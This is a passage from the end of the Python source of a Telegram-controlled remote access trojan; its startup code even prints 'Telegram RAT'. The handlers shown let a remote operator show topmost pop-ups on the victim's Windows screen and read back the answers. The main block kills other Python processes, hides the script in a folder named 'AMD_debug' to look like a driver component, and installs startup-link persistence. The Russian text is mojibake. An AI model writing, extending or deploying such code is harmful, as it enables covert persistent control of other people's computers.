            bot.send_message(message.chat.id, f'‚ö†Ô∏è –ù–æ–≤—ã–π —Ñ–∞–π–ª —Å–æ—Ö—Ä–∞–Ω–µ–Ω, –Ω–æ –Ω–µ —É–¥–∞–ª–æ—Å—å –µ–≥–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å: {e}')
        
    except Exception as e:
        bot.send_message(message.chat.id, f'‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏: {str(e)}')

def popup_show_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    
    text = message.text.strip()
    if not text:
        bot.send_message(message.chat.id, '‚ùå –¢–µ–∫—Å—Ç –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º.')
        return
    
    bot.send_message(message.chat.id, f'üí¨ –ü–æ–∫–∞–∑—ã–≤–∞—é popup: "{text}"')
    
    try:
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º Windows API –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è popup –æ–∫–Ω–∞
        import ctypes
        from ctypes import wintypes
        
        # –≠–∫—Ä–∞–Ω–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç –¥–ª—è Windows API
        safe_text = text.replace('"', '\\"').replace('\n', '\\n')
        
        # –°–æ–∑–¥–∞–µ–º popup —á–µ—Ä–µ–∑ MessageBoxW —Å –∫–Ω–æ–ø–∫–∞–º–∏ –î–∞/–ù–µ—Ç –∏ topmost
        result = ctypes.windll.user32.MessageBoxW(
            0,  # hWnd (—Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–µ –æ–∫–Ω–æ)
            safe_text,  # lpText (—Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è)
            "–°–æ–æ–±—â–µ–Ω–∏–µ",  # lpCaption (–∑–∞–≥–æ–ª–æ–≤–æ–∫)
            0x24 | 0x1000  # uType (MB_ICONQUESTION | MB_YESNO | MB_TOPMOST)
        )
        
        if result == 6:  # IDYES
            bot.send_message(message.chat.id, '‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã–±—Ä–∞–ª: –î–ê')
        elif result == 7:  # IDNO
            bot.send_message(message.chat.id, '‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã–±—Ä–∞–ª: –ù–ï–¢')
        elif result == 0:  # –û—à–∏–±–∫–∞
            bot.send_message(message.chat.id, '‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–∫–∞–∑–∞—Ç—å popup —Å–æ–æ–±—â–µ–Ω–∏–µ.')
        else:
            bot.send_message(message.chat.id, f'‚úÖ Popup –ø–æ–∫–∞–∑–∞–Ω, —Ä–µ–∑—É–ª—å—Ç–∞—Ç: {result}')
        
    except Exception as e:
        # –ï—Å–ª–∏ Windows API –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –ø—Ä–æ–±—É–µ–º —á–µ—Ä–µ–∑ PowerShell
        try:
            # –≠–∫—Ä–∞–Ω–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç –¥–ª—è PowerShell
            ps_text = text.replace('"', '`"').replace("'", "''")
            
            # –°–æ–∑–¥–∞–µ–º PowerShell –∫–æ–º–∞–Ω–¥—É —Å –∫–Ω–æ–ø–∫–∞–º–∏ –î–∞/–ù–µ—Ç
            ps_command = f'''
Add-Type -AssemblyName System.Windows.Forms
$result = [System.Windows.Forms.MessageBox]::Show("{ps_text}", "–°–æ–æ–±—â–µ–Ω–∏–µ", "YesNo", "Question", "DefaultButton1", "TopMost")
if ($result -eq "Yes") {{ Write-Output "YES" }} else {{ Write-Output "NO" }}
'''
            
            # –ó–∞–ø—É—Å–∫–∞–µ–º PowerShell
            result = subprocess.run([
                'powershell', '-Command', ps_command
            ], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                output = result.stdout.strip()
                if output == "YES":
                    bot.send_message(message.chat.id, '‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã–±—Ä–∞–ª: –î–ê')
                elif output == "NO":
                    bot.send_message(message.chat.id, '‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã–±—Ä–∞–ª: –ù–ï–¢')
                else:
                    bot.send_message(message.chat.id, f'‚úÖ Popup –ø–æ–∫–∞–∑–∞–Ω, —Ä–µ–∑—É–ª—å—Ç–∞—Ç: {output}')
            else:
                bot.send_message(message.chat.id, f'‚ùå –û—à–∏–±–∫–∞ PowerShell: {result.stderr}')
                
        except Exception as e2:
            bot.send_message(message.chat.id, f'‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–∫–∞–∑–µ popup: {str(e2)}')

@bot.callback_query_handler(func=lambda call: call.data == 'popup:cancel')
def popup_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'update:cancel')
def update_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

def start_bot_with_reconnect():
    """–ó–∞–ø—É—Å–∫–∞–µ—Ç –±–æ—Ç–∞ —Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–º –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ–º"""
    retry_delay = 5
    
    while True:
        try:
            print("ü§ñ –ó–∞–ø—É—Å–∫–∞–µ–º Telegram –±–æ—Ç–∞...")
            bot.polling(none_stop=True, timeout=20, long_polling_timeout=20)
        except Exception as e:
            error_msg = str(e).lower()
            print(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: {e}")
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–∏–ø –æ—à–∏–±–∫–∏
            if 'network' in error_msg or 'connection' in error_msg or 'timeout' in error_msg:
                print("üåê –ü—Ä–æ–±–ª–µ–º–∞ —Å —Å–µ—Ç—å—é, –∂–¥–µ–º –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è...")
                wait_for_internet()
                retry_delay = 5  # –°–±—Ä–∞—Å—ã–≤–∞–µ–º –∑–∞–¥–µ—Ä–∂–∫—É –ø–æ—Å–ª–µ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è —Å–µ—Ç–∏
            else:
                print(f"üîÑ –ü–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —á–µ—Ä–µ–∑ {retry_delay} —Å–µ–∫—É–Ω–¥...")
                time.sleep(retry_delay)
                retry_delay = min(retry_delay * 1.5, 60)  # –º–∞–∫—Å–∏–º—É–º 60 —Å–µ–∫—É–Ω–¥

def check_internet_connection():
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –∏–Ω—Ç–µ—Ä–Ω–µ—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ"""
    try:
        import urllib.request
        urllib.request.urlopen('http://google.com', timeout=5)
        return True
    except:
        return False

def check_bot_token():
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å —Ç–æ–∫–µ–Ω–∞ –±–æ—Ç–∞"""
    try:
        bot.get_me()
        return True
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Ç–æ–∫–µ–Ω–∞ –±–æ—Ç–∞: {e}")
        return False

def wait_for_internet():
    """–ñ–¥–µ—Ç –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è –∏–Ω—Ç–µ—Ä–Ω–µ—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è"""
    print("üåê –û–∂–∏–¥–∞–Ω–∏–µ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è –∏–Ω—Ç–µ—Ä–Ω–µ—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è...")
    while not check_internet_connection():
        time.sleep(5)
    print("‚úÖ –ò–Ω—Ç–µ—Ä–Ω–µ—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ!")

if __name__ == '__main__':
    print("üöÄ –ó–∞–ø—É—Å–∫ Telegram RAT...")
    
    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º Qt –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
    print("üîî –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º—ã —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π...")
    init_qt_app()
    
    # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –¥—Ä—É–≥–∏–µ Python –ø—Ä–æ—Ü–µ—Å—Å—ã
    print("üîÑ –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –¥—Ä—É–≥–∏—Ö Python –ø—Ä–æ—Ü–µ—Å—Å–æ–≤...")
    kill_other_python_processes()
    
    # –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º AMD_debug –ø–∞–ø–∫—É –∏ –ø–µ—Ä–µ–º–µ—â–∞–µ–º —Å–∫—Ä–∏–ø—Ç
    print("üìÅ –ù–∞—Å—Ç—Ä–æ–π–∫–∞ AMD_debug...")
    script_path = setup_amd_debug_folder()
    
    # –û—á–∏—â–∞–µ–º —Å—Ç–∞—Ä—ã–µ —Å—Å—ã–ª–∫–∏ –∏ —Å–æ–∑–¥–∞–µ–º –Ω–æ–≤—É—é
    print("üîó –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞...")
    cleanup_startup_links(allowed_script_path=script_path)
    create_startup_link(script_path)
    
    # –ñ–¥–µ–º –∏–Ω—Ç–µ—Ä–Ω–µ—Ç –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º
    if not check_internet_connection():
        wait_for_internet()
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–æ–∫–µ–Ω –±–æ—Ç–∞
    if not check_bot_token():
        print("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ç–æ–∫–µ–Ω –±–æ—Ç–∞! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ API_TOKEN")
        input("–ù–∞–∂–º–∏—Ç–µ Enter –¥–ª—è –≤—ã—Ö–æ–¥–∞...")
        sys.exit(1)
    
    print("‚úÖ –¢–æ–∫–µ–Ω –±–æ—Ç–∞ –≤–∞–ª–∏–¥–µ–Ω")
    
    # –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ—Ç–∫–ª—é—á–µ–Ω—ã –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞ —Å –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ–º
    start_bot_with_reconnect()
